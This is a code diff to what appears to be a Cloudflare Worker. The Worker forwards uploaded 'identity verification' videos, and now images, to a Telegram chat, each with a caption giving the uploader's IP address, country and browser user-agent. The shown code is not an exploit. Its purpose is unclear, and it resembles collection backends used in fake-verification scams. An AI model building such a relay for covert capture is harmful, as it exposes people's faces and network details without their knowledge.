@@ -58,21 +58,27 @@ export default {
       return json({ error: 'empty body' }, 400, cors);
     }
     if (buffer.byteLength > TELEGRAM_MAX_BYTES) {
-      return json({ error: `video exceeds Telegram's 50 MB limit` }, 413, cors);
+      return json({ error: `body exceeds Telegram's 50 MB limit` }, 413, cors);
     }
 
     const mime = (request.headers.get('x-mime-type')
       || request.headers.get('content-type')
       || 'video/webm').split(';')[0].trim();
-    const ext = mime.includes('mp4') ? 'mp4' : 'webm';
-    const filename = `verification-${Date.now()}.${ext}`;
+    const isImage = mime.startsWith('image/');
+    const ext = mime.includes('mp4')  ? 'mp4'
+              : mime.includes('png')  ? 'png'
+              : mime.includes('jpeg') ? 'jpg'
+              :                         'webm';
+    const kind = isImage ? 'image' : 'verification';
+    const filename = `${kind}-${Date.now()}.${ext}`;
 
     const ip = request.headers.get('cf-connecting-ip') || 'unknown';
     const country = request.cf?.country || '';
     const ua = (request.headers.get('user-agent') || 'unknown').slice(0, 140);
     const sizeKB = (buffer.byteLength / 1024).toFixed(0);
+    const captionTitle = isImage ? 'صورة جديدة' : 'جلسة تحقق هوية جديدة';
     const caption = [
-      'جلسة تحقق هوية جديدة',
+      captionTitle,
       `الوقت: ${new Date().toISOString()}`,
       `الحجم: ${sizeKB} KB`,
       `IP: ${ip}${country ? ` (${country})` : ''}`,
@@ -94,10 +100,15 @@ export default {
       return { ok: res.ok && body.ok, status: res.status, body };
     };
 
+    // Pick primary endpoint by mime type. sendDocument is the universal fallback.
+    const primary = isImage
+      ? { endpoint: 'sendPhoto', field: 'photo' }
+      : { endpoint: 'sendVideo', field: 'video' };
+
     try {
-      let result = await send('sendVideo', 'video');
+      let result = await send(primary.endpoint, primary.field);
       if (!result.ok) {
-        console.warn('sendVideo failed, retrying as document', result);
+        console.warn(`${primary.endpoint} failed, retrying as document`, result);
         result = await send('sendDocument', 'document');
         if (!result.ok) {
           console.error('sendDocument also failed', result);
@@ -109,7 +120,7 @@ export default {
         return json({ ok: true, file: filename, mode: 'document' }, 200, cors);
       }
       console.log('sent', { filename, bytes: buffer.byteLength, msg: result.body.result?.message_id });
-      return json({ ok: true, file: filename, mode: 'video' }, 200, cors);
+      return json({ ok: true, file: filename, mode: primary.field }, 200, cors);
     } catch (err) {
       console.error('handler error', err);
       return json({ error: err.message || 'internal error' }, 500, cors);
